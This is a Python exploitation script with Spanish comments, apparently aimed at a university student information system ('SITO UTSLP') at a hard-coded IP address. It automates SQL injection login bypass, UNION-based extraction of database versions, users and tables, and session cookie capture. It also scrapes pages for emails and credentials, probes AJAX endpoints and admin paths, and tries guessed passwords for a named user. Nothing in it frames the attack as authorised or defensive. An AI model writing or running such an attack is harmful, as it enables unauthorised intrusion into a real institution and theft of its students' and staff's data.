#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOTACIÓN AGRESIVA SITO UTSLP - ENFOQUE REAL
Basado en hallazgos confirmados: SQL Injection en login
"""

import requests
import re
import json
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)

class SITOExploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
        self.base_url = f"http://{target}"
        
    def confirm_sql_injection(self):
        """Confirma y explota SQL Injection en el login"""
        print("[+] Confirmando SQL Injection en login...")
        
        # Payloads que mostraron ser exitosos
        successful_payloads = [
            "admin' OR '1'='1'--",
            "hnieto' OR 1=1--", 
            "' UNION SELECT 1,2,3--",
            "admin' AND 1=1--"
        ]
        
        login_url = f"{self.base_url}/jsp/index.jsp"
        
        for payload in successful_payloads:
            data = {
                'yAccion': 'login',
                'yUsuario': payload,
                'xUsuario': payload,
                'xContrasena': 'test123',
                'yIntentos': '1'
            }
            
            try:
                r = self.session.post(login_url, data=data, timeout=10)
                
                # Indicadores de éxito
                success_indicators = [
                    'cerrar_sesion' in r.text.lower(),
                    'hnieto' in r.text,
                    'Solicita Ficha de Admisión' not in r.text,
                    len(r.text) > 2000  # Página más larga = posible éxito
                ]
                
                if any(success_indicators):
                    print(f"✅ SQL Injection EXITOSO: {payload}")
                    
                    # Guardar respuesta
                    with open(f"sqli_success_{payload[:10]}.html", "w", encoding='utf-8') as f:
                        f.write(r.text)
                    
                    # Extraer cookies de sesión
                    if 'JSESSIONID' in r.cookies:
                        jsessionid = r.cookies['JSESSIONID']
                        print(f"🍪 JSESSIONID obtenida: {jsessionid}")
                        self.session.cookies.set('JSESSIONID', jsessionid)
                        return True
                        
            except Exception as e:
                print(f"❌ Error con payload {payload}: {e}")
        
        return False

    def exploit_authenticated_area(self):
        """Explota el área autenticada después del SQL Injection"""
        print("\n[+] Explotando área autenticada...")
        
        # Endpoints a probar con sesión
        endpoints = [
            "/jsp/index.jsp",
            "/jsp/cerrar_sesion.jsp", 
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z",
            "/jsp/escolar/proceso_admision_lic/proceso_interesado.jsp",
            "/jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1"
        ]
        
        for endpoint in endpoints:
            url = self.base_url + endpoint
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"📍 Accesible: {endpoint} ({len(r.text)} bytes)")
                    
                    # Buscar información sensible
                    self.search_sensitive_info(r.text, endpoint)
                    
            except Exception as e:
                print(f"❌ Error en {endpoint}: {e}")

    def search_sensitive_info(self, content, endpoint):
        """Busca información sensible en el contenido"""
        patterns = {
            'emails': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'database_info': r'(jdbc|mysql|database|host|port|user|password)[=:]\s*[\'"]?([^\'"\s>]+)',
            'credentials': r'(pass(word)?|pwd|usuario?|user)[=:]\s*[\'"]?([^\'"\s>]+)',
            'sql_queries': r'(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE).*?;',
            'hidden_inputs': r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        }
        
        for key, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"🔍 {endpoint} - {key}: {matches[:3]}")  # Mostrar solo primeros 3

    def advanced_sql_injection(self):
        """SQL Injection avanzada para extraer datos de la BD"""
        print("\n[+] Realizando SQL Injection avanzada...")
        
        # Usar el endpoint que sabemos que funciona
        login_url = f"{self.base_url}/jsp/index.jsp"
        
        # Payloads para extraer información de MySQL
        extraction_payloads = [
            # Extraer información de la BD
            ("hnieto' UNION SELECT @@version,@@hostname,database()--", "Información del sistema"),
            ("hnieto' UNION SELECT user(),current_user(),session_user()--", "Usuarios de BD"),
            ("hnieto' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--", "Tablas de la BD"),
            
            # Buscar tablas de usuarios
            ("hnieto' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_name LIKE '%user%'--", "Tablas de usuarios"),
            ("hnieto' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_name LIKE '%admin%'--", "Tablas de administradores"),
            ("hnieto' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_name LIKE '%login%'--", "Tablas de login"),
            
            # Extraer datos de posibles tablas de usuarios
            ("hnieto' UNION SELECT column_name,data_type,3 FROM information_schema.columns WHERE table_name='usuarios'--", "Columnas de tabla usuarios"),
            ("hnieto' UNION SELECT column_name,data_type,3 FROM information_schema.columns WHERE table_name='users'--", "Columnas de tabla users"),
        ]
        
        for payload, description in extraction_payloads:
            data = {
                'yAccion': 'login',
                'yUsuario': payload,
                'xUsuario': payload,
                'xContrasena': 'test',
                'yIntentos': '1'
            }
            
            try:
                print(f"🔧 Probando: {description}")
                r = self.session.post(login_url, data=data, timeout=10)
                
                # Analizar respuesta en busca de datos inyectados
                self.analyze_injection_results(r.text, payload, description)
                
            except Exception as e:
                print(f"❌ Error: {e}")

    def analyze_injection_results(self, content, payload, description):
        """Analiza los resultados de la inyección SQL"""
        # Buscar datos que parezcan ser de la BD
        data_patterns = [
            r'([A-Za-z0-9_]+@[A-Za-z0-9.]+)',  # Emails
            r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',  # IPs
            r'(root|admin|administrator|mysql|test|demo)',  # Usuarios comunes
            r'([A-Za-z0-9_]{4,20})',  # Posibles nombres de usuario
        ]
        
        found_data = []
        for pattern in data_patterns:
            matches = re.findall(pattern, content)
            if matches:
                # Filtrar resultados plausibles
                for match in matches:
                    if len(match) > 3 and match not in ['html', 'body', 'head', 'input']:
                        found_data.append(match)
        
        if found_data:
            print(f"🎯 {description} - Datos encontrados: {set(found_data[:10])}")
            
            # Guardar resultados interesantes
            with open("sql_injection_results.txt", "a", encoding='utf-8') as f:
                f.write(f"\n=== {description} ===\n")
                f.write(f"Payload: {payload}\n")
                f.write(f"Datos: {found_data[:10]}\n")

    def exploit_ajax_endpoints_with_session(self):
        """Explota endpoints AJAX con sesión activa"""
        print("\n[+] Explotando endpoints AJAX con sesión...")
        
        ajax_endpoints = [
            "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=",
            "/jsp/escolar/muestra_bachillerato_ajax.jsp?xCveBachillerato=",
        ]
        
        # Probar con sesión autenticada
        for endpoint in ajax_endpoints:
            url = self.base_url + endpoint + "1"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200 and len(r.text) > 10:
                    print(f"✅ AJAX accesible: {endpoint}")
                    print(f"   Respuesta: {r.text[:100]}...")
                    
                    # Probar inyección con sesión
                    sql_payloads = [
                        "1' UNION SELECT 'SQLi','Test','Success'--",
                        "1' OR '1'='1'--",
                        "1' AND 1=1--"
                    ]
                    
                    for payload in sql_payloads:
                        test_url = self.base_url + endpoint + payload
                        try:
                            r_test = self.session.get(test_url, timeout=5)
                            if r_test.status_code == 200:
                                print(f"🚨 Posible SQLi en AJAX: {payload[:30]}...")
                        except:
                            pass
                            
            except Exception as e:
                print(f"❌ Error en AJAX: {e}")

    def brute_force_sito_admin(self):
        """Fuerza bruta específica para área administrativa de SITO"""
        print("\n[+] Fuerza bruta área administrativa SITO...")
        
        admin_endpoints = [
            "/jsp/admin/",
            "/jsp/admin/index.jsp",
            "/jsp/admin/usuarios.jsp",
            "/jsp/admin/configuracion.jsp",
            "/jsp/database/",
            "/jsp/configuracion/",
        ]
        
        for endpoint in admin_endpoints:
            url = self.base_url + endpoint
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"🎯 ADMIN ACCESIBLE: {endpoint}")
                    # Guardar contenido para análisis
                    with open(f"admin_{endpoint.replace('/','_')}.html", "w", encoding='utf-8') as f:
                        f.write(r.text)
            except:
                continue

    def run_complete_exploitation(self):
        """Ejecuta la explotación completa"""
        print("="*80)
        print("EXPLOTACIÓN COMPLETA SITO UTSLP")
        print("="*80)
        
        # Paso 1: Confirmar y explotar SQL Injection
        if self.confirm_sql_injection():
            # Paso 2: Explotar con sesión obtenida
            self.exploit_authenticated_area()
            self.advanced_sql_injection()
            self.exploit_ajax_endpoints_with_session()
            self.brute_force_sito_admin()
        else:
            print("❌ No se pudo obtener sesión via SQL Injection")
            print("💡 Intentando métodos alternativos...")
            self.direct_login_attempt()

    def direct_login_attempt(self):
        """Intento de login directo con credenciales conocidas"""
        print("\n[+] Intentando login directo...")
        
        credentials = [
            ('hnieto', 'utslp'),
            ('admin', 'admin'),
            ('hnieto', 'hnieto123'),
        ]
        
        login_url = f"{self.base_url}/jsp/index.jsp"
        
        for username, password in credentials:
            data = {
                'yAccion': 'login',
                'yUsuario': username,
                'xUsuario': username,
                'xContrasena': password,
                'yIntentos': '1'
            }
            
            try:
                r = self.session.post(login_url, data=data, timeout=10)
                if 'cerrar_sesion' in r.text.lower():
                    print(f"✅ Login exitoso: {username}:{password}")
                    self.exploit_authenticated_area()
                    break
            except:
                continue

# Ejecutar explotación
if __name__ == "__main__":
    target = "189.254.143.102"
    exploiter = SITOExploiter(target)
    exploiter.run_complete_exploitation()